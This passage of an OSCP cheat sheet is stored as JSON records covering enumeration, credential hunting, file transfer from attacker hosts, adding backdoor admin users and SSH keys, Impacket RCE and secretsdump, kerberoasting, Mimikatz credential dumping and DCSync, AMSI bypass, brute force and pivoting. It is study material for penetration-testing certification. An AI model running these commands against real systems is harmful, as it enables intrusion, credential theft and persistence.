      {"language": "text", "command": "/var/log/mysql/mysql.log"},
      {"language": "text", "command": "/var/log/mysql/mysql-slow.log"}
    ],
    "related_cves": [],
    "source_file": "OSCP-Cheatsheet.pdf"
  },
  {
    "id": "linux_important_locations_ftp",
    "category": "Linux Enumeration",
    "title": "Linux: Important FTP Server Locations (ProFTPd, Pure-FTPd, vsftpd, wu-ftpd)",
    "content": "Configuration and log file locations for various FTP server implementations.",
    "tags": ["linux", "enumeration", "files", "ftp", "proftpd", "pure-ftpd", "vsftpd", "wu-ftpd", "config", "logs"],
    "code_snippets": [
      {"language": "text", "command": "/etc/proftpd/proftpd.conf"},
      {"language": "text", "command": "/etc/pure-ftpd/pure-ftpd.conf"},
      {"language": "text", "command": "/etc/vsftpd.conf"},
      {"language": "text", "command": "/etc/wu-ftpd/ftpaccess"},
      {"language": "text", "command": "/var/log/vsftpd.log"},
      {"language": "text", "command": "/var/log/pureftpd.log"},
      {"language": "text", "command": "/var/log/xferlog"}
    ],
    "related_cves": [],
    "source_file": "OSCP-Cheatsheet.pdf"
  },
  {
    "id": "linux_important_locations_network_system",
    "category": "Linux Enumeration",
    "title": "Linux: Important Network & System Locations",
    "content": "Key locations for system information (issue, release, motd), network configuration (interfaces, hosts, resolv.conf), filesystem mounts (fstab, mtab), boot loader config (grub.conf, lilo.conf), kernel modules, and system logs (syslog, messages, dmesg).",
    "tags": ["linux", "enumeration", "files", "system config", "network", "logs", "fstab", "grub", "modules", "syslog", "dmesg"],
    "code_snippets": [
      {"language": "text", "command": "/etc/hosts"},
      {"language": "text", "command": "/etc/resolv.conf"},
      {"language": "text", "command": "/etc/network/interfaces"},
      {"language": "text", "command": "/etc/fstab"},
      {"language": "text", "command": "/etc/mtab"},
      {"language": "text", "command": "/etc/issue"},
      {"language": "text", "command": "/etc/lsb-release"},
      {"language": "text", "command": "/etc/redhat-release"},
      {"language": "text", "command": "/etc/motd"},
      {"language": "text", "command": "/etc/syslog.conf"},
      {"language": "text", "command": "/var/log/messages"},
      {"language": "text", "command": "/var/log/syslog"},
      {"language": "text", "command": "/var/log/dmesg"}
    ],
    "related_cves": [],
    "source_file": "OSCP-Cheatsheet.pdf"
  },
  {
    "id": "linux_important_locations_procfs",
    "category": "Linux Enumeration",
    "title": "Linux: Important /proc Filesystem Locations",
    "content": "Key files within the /proc filesystem providing runtime information about the kernel, processes, network status, CPU, memory, mounts, and more.",
    "tags": ["linux", "enumeration", "files", "procfs", "kernel info", "process info", "network info", "cpuinfo", "meminfo", "mounts"],
    "code_snippets": [
      {"language": "text", "command": "/proc/version"},
      {"language": "text", "command": "/proc/cmdline"},
      {"language": "text", "command": "/proc/cpuinfo"},
      {"language": "text", "command": "/proc/meminfo"},
      {"language": "text", "command": "/proc/mounts"},
      {"language": "text", "command": "/proc/net/arp"},
      {"language": "text", "command": "/proc/net/tcp"},
      {"language": "text", "command": "/proc/modules"},
      {"language": "text", "command": "/proc/self/environ"},
      {"language": "text", "command": "/proc/<PID>/cmdline"},
      {"language": "text", "command": "/proc/<PID>/maps"}
    ],
    "related_cves": [],
    "source_file": "OSCP-Cheatsheet.pdf"
  },
  {
    "id": "linux_important_locations_user_history_config",
    "category": "Linux Enumeration",
    "title": "Linux: Important User History & Config Locations",
    "content": "User-specific configuration and history files typically found in the user's home directory.",
    "tags": ["linux", "enumeration", "files", "user config", "history", "bashrc", "profile", "mysql_history", "viminfo"],
    "code_snippets": [
      {"language": "text", "command": "~/.bash_history"},
      {"language": "text", "command": "~/.bashrc"},
      {"language": "text", "command": "~/.profile"},
      {"language": "text", "command": "~/.mysql_history"},
      {"language": "text", "command": "~/.nano_history"},
      {"language": "text", "command": "~/.php_history"},
      {"language": "text", "command": "~/.viminfo"}
    ],
    "related_cves": [],
    "source_file": "OSCP-Cheatsheet.pdf"
  },
  {
    "id": "find_kdbx_files",
    "category": "Credential Hunting",
    "title": "Finding KeePass KDBX Files",
    "content": "Commands to search for KeePass database files (.kdbx) recursively on Windows and Linux systems.",
    "tags": ["keepass", "kdbx", "password manager", "credential hunting", "windows", "linux", "powershell", "find"],
    "code_snippets": [
      {"language": "powershell", "command": "Get-ChildItem -Path C:\\ -Include *.kdbx - File -Recurse -ErrorAction SilentlyContinue"},
      {"language": "bash", "command": "find / -name *.kdbx 2>/dev/null"}
    ],
    "related_cves": [],
    "source_file": "OSCP-Cheatsheet.pdf"
  },
  {
    "id": "github_recon_git",
    "category": "Reconnaissance",
    "title": "GitHub Recon & Local Git Analysis",
    "content": "Techniques for analyzing local Git repositories found on target machines. Use `git log` to view commit history and `git show <commit-id>` to inspect individual commits for potentially leaked secrets. Use `git-dumper` to download exposed .git directories from web servers.",
    "tags": ["recon", "osint", "git", "github", "secrets", "git log", "git show", "git-dumper", "gitleaks"],
    "code_snippets": [
      {"language": "bash", "command": "git log"},
      {"language": "bash", "command": "git show <commit-id>"},
      {"language": "bash", "command": "git-dumper <url> <output_dir>"}
    ],
    "related_cves": [],
    "source_file": "OSCP-Cheatsheet.pdf"
  },
  {
    "id": "connect_rdp_xfreerdp",
    "category": "Lateral Movement",
    "title": "Connecting to RDP (xfreerdp)",
    "content": "Commands for connecting to Windows Remote Desktop using `xfreerdp` with username/password, domain credentials, and the clipboard sharing option.",
    "tags": ["rdp", "windows", "xfreerdp", "lateral movement", "connection"],
    "code_snippets": [
      {"language": "bash", "command": "xfreerdp /u:uname /p:'pass' /v:<target_ip>"},
      {"language": "bash", "command": "xfreerdp /d:domain.com /u:uname /p:'pass' /v:<target_ip>"},
      {"language": "bash", "command": "xfreerdp /u:uname /p:'pass' /v:<target_ip> +clipboard"}
    ],
    "related_cves": [],
    "source_file": "OSCP-Cheatsheet.pdf"
  },
  {
    "id": "add_ssh_public_key",
    "category": "Persistence",
    "title": "Adding SSH Public Key for Access",
    "content": "Steps to generate an SSH key pair (`ssh-keygen`), create the `.ssh` directory on the target Linux machine, add the public key content to `~/.ssh/authorized_keys`, and set correct permissions (`chmod 700`, `chmod 600`) to enable passwordless SSH login.",
    "tags": ["ssh", "linux", "persistence", "authorized_keys", "ssh-keygen", "chmod"],
    "code_snippets": [
      {"language": "bash", "command": "ssh-keygen -t rsa -b 4096"},
      {"language": "bash", "command": "chmod 700 ~/.ssh"},
      {"language": "bash", "command": "nano ~/.ssh/authorized_keys"},
      {"language": "bash", "command": "chmod 600 ~/.ssh/authorized_keys"},
      {"language": "bash", "command": "ssh username@<target_ip>"}
    ],
    "related_cves": [],
    "source_file": "OSCP-Cheatsheet.pdf"
  },
  {
    "id": "file_transfer_netcat",
    "category": "File Transfer",
    "title": "File Transfer: Netcat",
    "content": "Using Netcat (`nc`) for basic file transfers. One machine listens (`nc -lvp > file`) while the other sends (`nc <ip> < file`).",
    "tags": ["file transfer", "netcat", "nc"],
    "code_snippets": [
      {"language": "bash", "command": "# Attacker sending nmap file"},
      {"language": "bash", "command": "nc <target_ip> 1234 < nmap"},
      {"language": "bash", "command": "# Target receiving nmap file"},
      {"language": "bash", "command": "nc -lvp 1234 > nmap"}
    ],
    "related_cves": [],
    "source_file": "OSCP-Cheatsheet.pdf"
  },
  {
    "id": "file_transfer_download_windows",
    "category": "File Transfer",
    "title": "File Transfer: Downloading on Windows",
    "content": "Various commands to download files onto a Windows target from an attacker-controlled HTTP server or SMB share, using PowerShell (`Invoke-WebRequest`, `iwr`), `certutil`, and `copy`.",
    "tags": ["file transfer", "windows", "download", "powershell", "iwr", "invoke-webrequest", "certutil", "copy", "smb", "http"],
    "code_snippets": [
      {"language": "powershell", "command": "Invoke-WebRequest -Uri http://<kali_ip>:<LPORT>/<FILE> -Outfile C:\\\\temp\\\\<FILE>"},
      {"language": "powershell", "command": "iwr -uri http://<kali_ip>/file -Outfile file"},
      {"language": "bash", "command": "certutil -urlcache -split -f \"http://<kali_ip>/<FILE>\" <FILE>"},
      {"language": "bash", "command": "copy \\\\<kali_ip>\\share\\file ." }
    ],
    "related_cves": [],
    "source_file": "OSCP-Cheatsheet.pdf"
  },
  {
    "id": "file_transfer_download_linux",
    "category": "File Transfer",
    "title": "File Transfer: Downloading on Linux",
    "content": "Commands to download files onto a Linux target from an attacker-controlled HTTP server using `wget` or `curl`.",
    "tags": ["file transfer", "linux", "download", "wget", "curl", "http"],
    "code_snippets": [
      {"language": "bash", "command": "wget http://<kali_ip>/file"},
      {"language": "bash", "command": "curl http://<kali_ip>/<FILE> > <OUTPUT_FILE>"}
    ],
    "related_cves": [],
    "source_file": "OSCP-Cheatsheet.pdf"
  },
   {
    "id": "file_transfer_windows_to_kali_smb",
    "category": "File Transfer",
    "title": "File Transfer: Windows to Kali (SMB)",
    "content": "Set up an SMB server on Kali using `impacket-smbserver`. On the Windows target, use `copy` to transfer files to the Kali share.",
    "tags": ["file transfer", "windows", "linux", "smb", "impacket-smbserver", "copy", "upload"],
    "code_snippets": [
      {"language": "bash", "command": "impacket-smbserver -smb2support <sharename> ."},
      {"language": "bash", "command": "copy file \\\\<kali_ip>\\sharename"}
    ],
    "related_cves": [],
    "source_file": "OSCP-Cheatsheet.pdf"
  },
  {
    "id": "add_user_windows",
    "category": "Persistence",
    "title": "Adding Users: Windows",
    "content": "Commands to add a new user, add them to the Administrators group, and add them to the Remote Desktop Users group using `net user` and `net localgroup`.",
    "tags": ["windows", "persistence", "user management", "net user", "net localgroup", "administrator", "rdp"],
    "code_snippets": [
      {"language": "bash", "command": "net user hacker hacker123 /add"},
      {"language": "bash", "command": "net localgroup Administrators hacker /add"},
      {"language": "bash", "command": "net localgroup \"Remote Desktop Users\" hacker /ADD"}
    ],
    "related_cves": [],
    "source_file": "OSCP-Cheatsheet.pdf"
  },
  {
    "id": "add_user_linux",
    "category": "Persistence",
    "title": "Adding Users: Linux",
    "content": "Commands to add a new user interactively (`adduser`) or non-interactively (`useradd`), optionally specifying UID and group.",
    "tags": ["linux", "persistence", "user management", "adduser", "useradd"],
    "code_snippets": [
      {"language": "bash", "command": "adduser <uname>"},
      {"language": "bash", "command": "useradd <uname>"},
      {"language": "bash", "command": "useradd -u <UID> -g <group> <uname>"}
    ],
    "related_cves": [],
    "source_file": "OSCP-Cheatsheet.pdf"
  },
  {
    "id": "password_cracking_tools",
    "category": "Password Attack",
    "title": "Password Cracking: Tools (fcrackzip, John, Hashcat)",
    "content": "Overview of tools for offline password cracking. Use `fcrackzip` for zip files. Use `*2john` utilities (e.g., `ssh2john.py`) to convert files/hashes to John the Ripper format, then crack with `john`. Use `hashcat` with the appropriate mode (`-m <number>`) for various hash types.",
    "tags": ["password attack", "cracking", "offline attack", "fcrackzip", "john the ripper", "john", "ssh2john", "hashcat", "hash", "zip"],
    "code_snippets": [
      {"language": "bash", "command": "fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt <FILE>.zip"},
      {"language": "bash", "command": "ssh2john.py id_rsa > hash"},
      {"language": "bash", "command": "john hashfile --wordlist=rockyou.txt"},
      {"language": "bash", "command": "hashcat -m <number> hash wordlists.txt --force"}
    ],
    "related_cves": [],
    "source_file": "OSCP-Cheatsheet.pdf"
  },
  {
    "id": "pivoting_ssh_dynamic",
    "category": "Pivoting",
    "title": "Pivoting through SSH (Dynamic Port Forwarding)",
    "content": "Create a SOCKS proxy using SSH dynamic port forwarding (`ssh -D 9050`). Configure `/etc/proxychains4.conf` to use this proxy (`socks5 127.0.0.1 9050`). Use `proxychains4` to route other tools (like `crackmapexec`) through the tunnel.",
    "tags": ["pivoting", "ssh", "ssh tunneling", "dynamic port forwarding", "ssh_d", "socks proxy", "proxychains"],
    "code_snippets": [
      {"language": "bash", "command": "ssh adminuser@<target_ip> -i id_rsa -D 9050"},
      {"language": "bash", "command": "proxychains4 crackmapexec smb 10.10.10.0/24"}
    ],
    "related_cves": [],
    "source_file": "OSCP-Cheatsheet.pdf"
  },
  {
    "id": "password_guessing_strategies",
    "category": "Password Attack",
    "title": "Password Guessing Strategies",
    "content": "General tips for password guessing or brute-forcing: try default credentials (admin:admin), username as password, service name as password, use rockyou.txt, and common defaults like 'password', 'password1', 'Password@123', 'admin', 'administrator'.",
    "tags": ["password attack", "brute force", "password guessing", "default credentials", "rockyou"],
    "code_snippets": [
        {"language": "text", "command": "password"},
        {"language": "text", "command": "Password@123"},
        {"language": "text", "command": "admin"}
    ],
    "related_cves": [],
    "source_file": "OSCP-Cheatsheet.pdf"
  },
  {
    "id": "impacket_smbclient",
    "category": "Impacket",
    "title": "Impacket: smbclient.py",
    "content": "Connect to SMB shares using `smbclient.py`, providing domain, user, and password or hash.",
    "tags": ["impacket", "smb", "smbclient.py", "connection"],
    "code_snippets": [
      {"language": "bash", "command": "smbclient.py [domain]/[user]:[password or hash]@<target_ip>"}
    ],
    "related_cves": [],
    "source_file": "OSCP-Cheatsheet.pdf"
  },
  {
    "id": "impacket_lookupsid",
    "category": "Impacket",
    "title": "Impacket: lookupsid.py",
    "content": "Enumerate users on a target machine via SMB using `lookupsid.py`.",
    "tags": ["impacket", "smb", "lookupsid.py", "user enumeration", "active directory"],
    "code_snippets": [
      {"language": "bash", "command": "lookupsid.py [domain]/[user]:[password or hash]@<target_ip>"}
    ],
    "related_cves": [],
    "source_file": "OSCP-Cheatsheet.pdf"
  },
  {
    "id": "impacket_services",
    "category": "Impacket",
    "title": "Impacket: services.py",
    "content": "Enumerate services on a target machine using `services.py`.",
    "tags": ["impacket", "smb", "rpc", "services.py", "service enumeration", "windows"],
    "code_snippets": [
      {"language": "bash", "command": "services.py [domain]/[user]:[password or hash]@<target_ip> [Action]"}
    ],
    "related_cves": [],
    "source_file": "OSCP-Cheatsheet.pdf"
  },
  {
    "id": "impacket_secretsdump",
    "category": "Impacket",
    "title": "Impacket: secretsdump.py",
    "content": "Dump hashes (SAM, LSA secrets, NTDS.dit) from a target machine using `secretsdump.py`. Can authenticate with password or hash.",
    "tags": ["impacket", "secretsdump.py", "hash dumping", "sam", "lsa", "ntds.dit", "active directory", "windows"],
    "code_snippets": [
      {"language": "bash", "command": "secretsdump.py [domain]/[user]:[password or hash]@<target_ip>"}
    ],
    "related_cves": [],
    "source_file": "OSCP-Cheatsheet.pdf"
  },
  {
    "id": "impacket_getuserspns",
    "category": "Impacket",
    "title": "Impacket: GetUserSPNs.py (Kerberoasting)",
    "content": "Perform Kerberoasting by requesting service tickets (TGS) for accounts with Service Principal Names (SPNs) using `GetUserSPNs.py`. Use `-request` to dump the ticket hashes.",
    "tags": ["impacket", "getuserspns.py", "kerberoasting", "active directory", "kerberos", "spn"],
    "code_snippets": [
      {"language": "bash", "command": "GetUserSPNs.py [domain]/[user]:[password or hash] -dc-ip <target_ip> -request"}
    ],
    "related_cves": [],
    "source_file": "OSCP-Cheatsheet.pdf"
  },
  {
    "id": "impacket_getnpusers",
    "category": "Impacket",
    "title": "Impacket: GetNPUsers.py (AS-REP Roasting)",
    "content": "Perform AS-REP Roasting by requesting authentication data for users without Kerberos pre-authentication enabled, using `GetNPUsers.py`. Requires a list of usernames.",
    "tags": ["impacket", "getnpusers.py", "asrep roasting", "active directory", "kerberos"],
    "code_snippets": [
      {"language": "bash", "command": "GetNPUsers.py <domain>/-dc-ip <target_ip> -usersfile usernames.txt -format hashcat -outputfile hashes.txt"}
    ],
    "related_cves": [],
    "source_file": "OSCP-Cheatsheet.pdf"
  },
  {
    "id": "impacket_rce",
    "category": "Impacket",
    "title": "Impacket: Remote Code Execution (psexec, wmiexec, smbexec, atexec)",
    "content": "Achieve RCE on Windows targets using various Impacket scripts: `psexec.py`, `wmiexec.py`, `smbexec.py`, `atexec.py`. These tools support authentication with both passwords and NTLM hashes (`-hashes lmhash:nthash`).",
    "tags": ["impacket", "rce", "windows", "psexec.py", "wmiexec.py", "smbexec.py", "atexec.py", "pass the hash", "lateral movement"],
    "code_snippets": [
      {"language": "bash", "command": "psexec.py <domain>/<user>:<password>@<target_ip>"},
      {"language": "bash", "command": "psexec.py -hashes <lm>:<nt> <domain>/<user>@<target_ip>"},
      {"language": "bash", "command": "wmiexec.py <domain>/<user>:<password>@<target_ip>"},
      {"language": "bash", "command": "wmiexec.py -hashes <lm>:<nt> <domain>/<user>@<target_ip>"},
      {"language": "bash", "command": "smbexec.py <domain>/<user>:<password>@<target_ip>"},
      {"language": "bash", "command": "atexec.py <domain>/<user>:<password>@<target_ip> <command>"}
    ],
    "related_cves": [],
    "source_file": "OSCP-Cheatsheet.pdf"
  },
  {
    "id": "evil_winrm_connection",
    "category": "Evil-WinRM",
    "title": "Evil-WinRM: Connecting",
    "content": "Connect to Windows targets via WinRM using Evil-WinRM. Supports authentication via password (`-p`), NTLM hash (`-H`), or certificate (`-c`, `-k`). Use `-S` for SSL connections (port 5986).",
    "tags": ["evil-winrm", "winrm", "windows", "connection", "pass the hash", "ssl"],
    "code_snippets": [
      {"language": "bash", "command": "evil-winrm -i <target_ip> -u user -p pass"},
      {"language": "bash", "command": "evil-winrm -i <target_ip> -u user -p pass -S"},
      {"language": "bash", "command": "evil-winrm -i <target_ip> -u user -H ntlmhash"}
    ],
    "related_cves": [],
    "source_file": "OSCP-Cheatsheet.pdf"
  },
  {
    "id": "evil_winrm_features",
    "category": "Evil-WinRM",
    "title": "Evil-WinRM: Features (Upload, Download, Scripts, AMSI Bypass)",
    "content": "Evil-WinRM provides built-in commands for file transfer (`upload`, `download`), loading PowerShell scripts directly from Kali (`-s`), bypassing AMSI (`Bypass-4MSI`), and executing binaries (`Invoke-Binary`). Use `menu` to view available commands.",
    "tags": ["evil-winrm", "winrm", "windows", "file transfer", "amsi bypass", "powershell"],
    "code_snippets": [
      {"language": "bash", "command": "upload <file>"},
      {"language": "bash", "command": "download <file> <filepath-kali>"},
      {"language": "bash", "command": "evil-winrm -i <target_ip> -u user -p pass -s /opt/privsc/powershell"},
      {"language": "bash", "command": "Bypass-4MSI"},
      {"language": "bash", "command": "menu"},
      {"language": "bash", "command": "Invoke-Binary /opt/privsc/winPEASx64.exe"}
    ],
    "related_cves": [],
    "source_file": "OSCP-Cheatsheet.pdf"
  },
  {
    "id": "mimikatz_credential_dumping",
    "category": "Mimikatz",
    "title": "Mimikatz: Credential Dumping",
    "content": "Use Mimikatz to dump credentials. Requires `privilege::debug`. `sekurlsa::logonpasswords` dumps credentials (plaintext and hashes) from LSASS memory. `lsadump::sam` (or `lsadump::lsa /patch`) dumps hashes from the SAM database (requires SYSTEM or access to offline hives).",
    "tags": ["mimikatz", "windows", "credential dumping", "hash dumping", "lsass", "sam", "privilege::debug", "token::elevate", "sekurlsa::logonpasswords", "lsadump::sam", "lsadump::lsa"],
    "code_snippets": [
      {"language": "powershell", "command": "privilege::debug"},
      {"language": "powershell", "command": "token::elevate"},
      {"language": "powershell", "command": "sekurlsa::logonpasswords"},
      {"language": "powershell", "command": "lsadump::sam"},
      {"language": "powershell", "command": "lsadump::lsa /patch"},
      {"language": "powershell", "command": ".\\mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\""}
    ],
    "related_cves": [],
    "source_file": "OSCP-Cheatsheet.pdf"
  },
  {
    "id": "mimikatz_dcsync",
    "category": "Mimikatz",
    "title": "Mimikatz: DCSync",
    "content": "Use the `lsadump::dcsync /user:<domain>\\<username>` command in Mimikatz to request password hashes from a Domain Controller using the Directory Replication Service protocol. Requires specific replication privileges (usually Domain Admin). Can dump `krbtgt` hash.",
    "tags": ["mimikatz", "windows", "active directory", "dcsync", "hash dumping", "krbtgt", "replication"],
    "code_snippets": [
      {"language": "powershell", "command": "lsadump::dcsync /user:krbtgt"}
    ],
    "related_cves": [],
    "source_file": "OSCP-Cheatsheet.pdf"
  },
  {
    "id": "ligolo_ng_pivoting",
    "category": "Pivoting",
    "title": "Pivoting with Ligolo-ng",
    "content": "Ligolo-ng allows pivoting through a compromised host using TUN interfaces. Set up the TUN interface on Kali (`ip tuntap add`, `ip link set up`). Run the `proxy` on Kali (`./proxy -selfcert`). Run the `agent` on the compromised host (`agent.exe -connect -ignore-cert`). In the Ligolo console on Kali, select the session, add routes to internal subnets (`ip r add <subnet> dev ligolo`), and `start` the tunnel.",
    "tags": ["pivoting", "tunneling", "ligolo-ng", "tun interface", "proxy", "agent", "routing"],
    "code_snippets": [
      {"language": "bash", "command": "sudo ip tuntap add user $(whoami) mode tun ligolo"},
      {"language": "bash", "command": "sudo ip link set ligolo up"},
      {"language": "bash", "command": "./proxy -laddr 0.0.0.0:9001 -selfcert"},
      {"language": "bash", "command": "agent.exe -connect <kali_ip>:9001 -ignore-cert"},
      {"language": "bash", "command": "# In Ligolo console:"},
      {"language": "bash", "command": "session"},
      {"language": "bash", "command": "start"},
      {"language": "bash", "command": "# On Kali shell:"},
      {"language": "bash", "command": "sudo ip r add <subnet> dev ligolo"}
    ],
    "related_cves": [],
    "source_file": "OSCP-Cheatsheet.pdf"
  },
  {
    "id": "recon_osint",
    "category": "Reconnaissance",
    "title": "Recon: OSINT / Passive Recon",
    "content": "Gathering information without directly interacting with the target. Use `whois` for domain registration details. Use Google Dorking (`site:`, `filetype:`, `intitle:`, GHDB). Use Netcraft (searchdns.netcraft.com) for OS/service info. Use Github Dorking (`filename:`, `user:`) or Gitleaks. Use Shodan (`hostname:`, `port:`). Check security headers (securityheaders.com).",
    "tags": ["recon", "osint", "passive recon", "whois", "google dorking", "netcraft", "github dorking", "gitleaks", "shodan", "security headers"],
    "code_snippets": [
      {"language": "bash", "command": "whois <domain>"},
      {"language": "text", "command": "site:<domain> filetype:pdf"}
    ],
    "related_cves": [],
    "source_file": "OSCP-Cheatsheet.pdf"
  },
  {
    "id": "recon_port_scanning_nmap",
    "category": "Reconnaissance",
    "title": "Recon: Port Scanning (Nmap)",
    "content": "Use Nmap for port scanning. Basic scan: `-sC -sV`. Complete scan: `-T4 -A -p-`. Run vulnerability scripts: `--script vuln`. Use `-Pn` if ping is blocked. Locate NSE scripts with `locate .nse | grep <name>` and run with `--script=<name>`.",
    "tags": ["recon", "port scanning", "nmap", "nse", "scripts"],
    "code_snippets": [
      {"language": "bash", "command": "nmap -sC -sV <target_ip> -v"},
      {"language": "bash", "command": "nmap -T4 -A -p- <target_ip> -v -Pn"},
      {"language": "bash", "command": "sudo nmap -sV -p 443 --script \"vuln\" <target_ip>"},
      {"language": "bash", "command": "sudo nmap --script=\"<name>\" <target_ip>"}
    ],
    "related_cves": [],
    "source_file": "OSCP-Cheatsheet.pdf"
  },
  {
    "id": "recon_port_scanning_powershell",
    "category": "Reconnaissance",
    "title": "Recon: Port Scanning (PowerShell)",
    "content": "Use PowerShell for basic port checks (`Test-NetConnection`) or loop through ports using `New-Object Net.Sockets.TcpClient`.",
    "tags": ["recon", "port scanning", "windows", "powershell", "test-netconnection", "tcpclient"],
    "code_snippets": [
      {"language": "powershell", "command": "Test-NetConnection -Port <port> <target_ip>"},
      {"language": "powershell", "command": "1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect(\"<target_ip>\", $_)) \"TCP port $_ is open\"} 2>$null"}
    ],
    "related_cves": [],
    "source_file": "OSCP-Cheatsheet.pdf"
  },
  {
    "id": "ftp_enumeration",
    "category": "Enumeration",
    "title": "FTP Enumeration",
    "content": "Connect to FTP using `ftp <IP>`. Try anonymous login (user: `anonymous`, pass: `<any>`). Use `put` to upload and `get` to download. Use Nmap NSE scripts (`locate .nse | grep ftp`, `nmap -p21 --script=<name>`). Brute-force credentials using `hydra`.",
    "tags": ["enumeration", "ftp", "anonymous ftp", "file transfer", "nmap", "nse", "hydra", "brute force"],
    "code_snippets": [
      {"language": "bash", "command": "ftp <target_ip>"},
      {"language": "text", "command": "put <file>"},
      {"language": "text", "command": "get <file>"},
      {"language": "bash", "command": "nmap -p21 --script=<name> <target_ip>"},
      {"language": "bash", "command": "hydra -L users.txt -P passwords.txt <target_ip> ftp"}
    ],
    "related_cves": [],
    "source_file": "OSCP-Cheatsheet.pdf"
  },
  {
    "id": "ssh_enumeration_attack",
    "category": "Enumeration",
    "title": "SSH Enumeration & Attack",
    "content": "Login via `ssh uname@IP`. If using a private key (`id_rsa`, `id_ecdsa`), ensure permissions are 600 (`chmod 600`). If the key requires a passphrase, crack it using `ssh2john` and `john`. Brute-force credentials using `hydra`.",
    "tags": ["enumeration", "attack", "ssh", "ssh keys", "id_rsa", "passphrase cracking", "ssh2john", "john", "hydra", "brute force"],
    "code_snippets": [
      {"language": "bash", "command": "ssh uname@<target_ip>"},
      {"language": "bash", "command": "chmod 600 id_rsa"},
      {"language": "bash", "command": "ssh uname@<target_ip> -i id_rsa"},
      {"language": "bash", "command": "ssh2john id_rsa > hash"},
      {"language": "bash", "command": "john --wordlist=/path/to/rockyou.txt hash"},
      {"language": "bash", "command": "hydra -l uname -P passwords.txt <target_ip> ssh"}
    ],
    "related_cves": [],
    "source_file": "OSCP-Cheatsheet.pdf"
  },
  {
    "id": "smb_enumeration_tools",
    "category": "Enumeration",
    "title": "SMB Enumeration (nbtscan, nmap, net view, cme, smbclient, smbmap)",
    "content": "Use various tools for SMB enumeration. `nbtscan` for NetBIOS scanning. Nmap NSE scripts (`locate .nse | grep smb`). `net view` on Windows. `crackmapexec smb` for scanning ranges, testing credentials, listing shares/users. `smbclient` for listing shares (`-L`) and interacting with them. `smbmap` for similar functionality. Inside `smbclient`, use `put`/`get` for files or `mask \"\"`, `recurse ON`, `prompt OFF`, `mget *` to download entire shares.",
    "tags": ["enumeration", "smb", "nbtscan", "nmap", "nse", "net view", "crackmapexec", "cme", "smbclient", "smbmap", "file transfer"],
    "code_snippets": [
      {"language": "bash", "command": "sudo nbtscan -r <target_ip>/24"},
      {"language": "bash", "command": "nmap -p445 --script=\"smb-enum-*\" <target_ip>"},
      {"language": "bash", "command": "net view \\\\<target_ip> /all"},
      {"language": "bash", "command": "crackmapexec smb <target_ip>/range"},
      {"language": "bash", "command": "crackmapexec smb <target_ip> -u user -p pass --shares"},
      {"language": "bash", "command": "smbclient -L //<target_ip>"},
      {"language": "bash", "command": "smbclient //<target_ip>/share -U domain/user"},
      {"language": "bash", "command": "smbmap -H <target_ip>"},
      {"language": "text", "command": "smb: \\> mget *"}
    ],
    "related_cves": [],
    "source_file": "OSCP-Cheatsheet.pdf"
  },
  {
    "id": "http_enumeration_general",
    "category": "Enumeration",
    "title": "HTTP/S Enumeration Techniques",
    "content": "General web enumeration steps: view source code, identify CMS/version (`nmap`, `Wappalyzer`), check `robots.txt`, map hostname in `/etc/hosts`, perform directory discovery (`gobuster`, `dirsearch`), scan vulnerabilities (`nikto`), inspect SSL certificate, try default credentials, brute-force logins (`hydra http-{post/get}-form`), fuzz CGI (`cgi-bin`), check for reflections from other services (FTP/SMB), fuzz APIs (`gobuster -p pattern`), test inputs for RCE/SQLi, LFI/RFI, and file upload vulnerabilities.",
    "tags": ["enumeration", "web", "http", "https", "source code", "cms", "robots.txt", "hosts file", "directory discovery", "gobuster", "dirsearch", "nikto", "ssl certificate", "default credentials", "brute force", "hydra", "cgi", "api", "rce", "sqli", "lfi", "rfi", "file upload"],
    "code_snippets": [
      {"language": "bash", "command": "gobuster dir -u http://<target_ip> -w /path/to/wordlist.txt"},
      {"language": "bash", "command": "nikto -h <target_ip>"},
      {"language": "bash", "command": "hydra -L users.txt -P password.txt <target_ip> http-post-form \"/path:user=^USER^&pass=^PASS^:Error Msg\" -V"},
      {"language": "bash", "command": "gobuster dir -u <api_base> -w wordlist.txt -p {GOBUSTER}/v1"}
    ],
    "related_cves": [],
    "source_file": "OSCP-Cheatsheet.pdf"
  },
  {
    "id": "http_enumeration_cms",
    "category": "Enumeration",
    "title": "HTTP/S Enumeration (CMS: WordPress, Drupal, Joomla)",
    "content": "Specific tools for CMS enumeration: `wpscan` for WordPress (enumerate vulnerable plugins `vp`, users `u`, themes `vt`, timthumbs `tt`), `droopescan` for Drupal and Joomla. Includes example `wpscan` command with API token and Joomla brute-force script.",
    "tags": ["enumeration", "web", "cms", "wordpress", "wpscan", "drupal", "joomla", "droopescan"],
    "code_snippets": [
      {"language": "bash", "command": "wpscan --url \"http://<target_ip>\" --enumerate vp,u,vt,tt --follow-redirection --verbose"},
      {"language": "bash", "command": "wpscan --url http://<target_ip> --api-token <token>"},
      {"language": "bash", "command": "droopescan scan drupal -u http://<target_ip>"},
      {"language": "bash", "command": "droopescan scan joomla --url http://<target_ip>"}
    ],
    "related_cves": [],
    "source_file": "OSCP-Cheatsheet.pdf"
  },
  {
    "id": "dns_enumeration",
    "category": "Enumeration",
    "title": "DNS Enumeration",
    "content": "Use `host` to query different record types (A, MX, TXT). Perform brute-force subdomain enumeration using loops with `host` or tools like `dnsrecon` (`-t std` for standard, `-t brt` for brute-force with wordlist) and `dnsenum`. Use `nslookup` (especially on Windows) to query specific types or servers.",
    "tags": ["enumeration", "dns", "host", "dnsrecon", "dnsenum", "nslookup", "brute force", "subdomain enumeration", "mx record", "txt record"],
    "code_snippets": [
      {"language": "bash", "command": "host www.megacorpone.com"},
      {"language": "bash", "command": "host -t mx megacorpone.com"},
      {"language": "bash", "command": "for ip in $(cat list.txt); do host $ip.megacorpone.com; done"},
      {"language": "bash", "command": "dnsrecon -d megacorpone.com -t std"},
      {"language": "bash", "command": "dnsrecon -d megacorpone.com -D ~/list.txt -t brt"},
      {"language": "bash", "command": "dnsenum megacorpone.com"},
      {"language": "bash", "command": "nslookup -type=TXT info.megacorptwo.com <target_ip>"}
    ],
    "related_cves": [],
    "source_file": "OSCP-Cheatsheet.pdf"
  },
  {
    "id": "smtp_enumeration_phishing",
    "category": "Enumeration",
    "title": "SMTP Enumeration & Phishing Example",
    "content": "Use `nc` to connect to port 25 for version detection. Use `smtp-user-enum` to verify usernames using VRFY, RCPT, or EXPN modes. Example `swaks` command demonstrates sending a phishing email with an attachment.",
    "tags": ["enumeration", "smtp", "nc", "smtp-user-enum", "phishing", "swaks"],
